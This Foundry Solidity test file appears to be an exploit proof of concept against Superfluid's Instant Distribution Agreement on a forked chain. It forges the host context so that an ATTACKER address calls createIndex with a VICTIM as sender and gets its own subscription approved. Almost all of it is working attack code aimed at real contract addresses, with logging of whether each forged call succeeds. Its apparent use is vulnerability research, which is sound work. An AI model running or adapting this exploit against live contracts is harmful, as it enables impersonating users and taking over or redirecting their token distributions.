// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ISuperfluid {
    function callAgreement(address, bytes calldata, bytes calldata) external returns (bytes memory);
}
interface IIDA {
    function createIndex(address token, uint32 indexId, bytes calldata ctx) external returns (bytes memory);
    function approveSubscription(address token, address publisher, uint32 indexId, bytes calldata ctx) external returns (bytes memory);
    function getIndex(address token, address publisher, uint32 indexId) external view returns (bool, uint128, uint128, uint128);
    function getSubscription(address token, address publisher, uint32 indexId, address subscriber) external view returns (bool, bool, uint128, uint256);
}
interface IMATICx {
    function balanceOf(address) external view returns (uint256);
}

contract ApproveChain2 is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant VICTIM = 0x1c81F6A5dbD715BE1a66a38F7Ed3Bbcd4098EDd4;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_createIndexForged() public {
        bytes memory fakeCtx = _buildCtx(VICTIM, IIDA.createIndex.selector);
        bytes memory inner = abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, uint32(777), fakeCtx);
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, outer, "") {
            console.log("createIndex SUCCEEDED!");
            (bool exist,,,) = IIDA(IDA).getIndex(MATICx, VICTIM, 777);
            console.log("Index under VICTIM:", exist);
        } catch {
            console.log("createIndex FAILED");
        }
    }

    function test_approveSubForged() public {
        address PUB = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
        bytes memory fakeCtx = _buildCtx(ATTACKER, IIDA.approveSubscription.selector);
        bytes memory inner = abi.encodeWithSelector(IIDA.approveSubscription.selector, MATICx, PUB, uint32(1), fakeCtx);
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, outer, "") {
            console.log("approveSubscription SUCCEEDED!");
            (bool e, bool a, uint128 u,) = IIDA(IDA).getSubscription(MATICx, PUB, 1, ATTACKER);
            console.log("exist:"); console.log(e); console.log("approved:"); console.log(a); console.log("units:"); console.log(u);
        } catch {
            console.log("approveSubscription FAILED");
        }
    }

    function _buildCtx(address sender, bytes4 sel) internal view returns (bytes memory) {
        uint256 callInfo = uint256(1) << 32;
        return abi.encode(
            abi.encode(callInfo, block.timestamp, sender, sel, bytes("")),
            abi.encode(uint256(0), int256(0), address(0), address(0))
        );
    }
}
